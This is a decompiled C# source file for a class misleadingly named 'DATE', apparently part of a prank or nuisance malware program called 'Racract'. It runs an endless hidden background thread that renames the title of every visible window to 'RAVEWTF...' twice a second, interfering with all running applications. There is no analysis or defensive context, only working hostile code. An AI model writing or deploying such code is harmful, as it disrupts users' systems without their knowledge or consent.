using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Racract
{
    internal class DATE
    {
        // Token: 0x0600004A RID: 74
        [DllImport("user32.dll")]
        private static extern bool EnumWindows(DATE.EnumWindowsProc lpEnumFunc, IntPtr lParam);

        // Token: 0x0600004B RID: 75
        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        // Token: 0x0600004C RID: 76
        [DllImport("user32.dll")]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        // Token: 0x0600004D RID: 77
        [DllImport("user32.dll")]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        // Token: 0x0600004E RID: 78
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetWindowText(IntPtr hWnd, string lpString);

        // Token: 0x0600004F RID: 79 RVA: 0x00002509 File Offset: 0x00000709
        public static void Start()
        {
            new Thread(delegate ()
            {
                for (; ; )
                {
                    EnumWindows(delegate (IntPtr hWnd, IntPtr lParam)
                    {
                        bool flag = IsWindowVisible(hWnd);
                        if (flag)
                        {
                            int windowTextLength = GetWindowTextLength(hWnd);
                            bool flag2 = windowTextLength > 0;
                            if (flag2)
                            {
                                StringBuilder stringBuilder = new StringBuilder(windowTextLength + 1);
                                GetWindowText(hWnd, stringBuilder, stringBuilder.Capacity);
                                string text = stringBuilder.ToString();
                                bool flag3 = text != null && text.Trim().Length != 0 && text != "Hello";
                                if (flag3)
                                {
                                    DATE.SetWindowText(hWnd, "RAVEWTFRAVEWTFRAVEWTFRAVEWTFRAVEWTF");
                                }
                            }
                        }
                        return true;
                    }, IntPtr.Zero);
                    Thread.Sleep(500);
                }
            })
            {
                IsBackground = true
            }.Start();
        }

        // Token: 0x0200002C RID: 44
        // (Invoke) Token: 0x060000CC RID: 204
        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
    }
}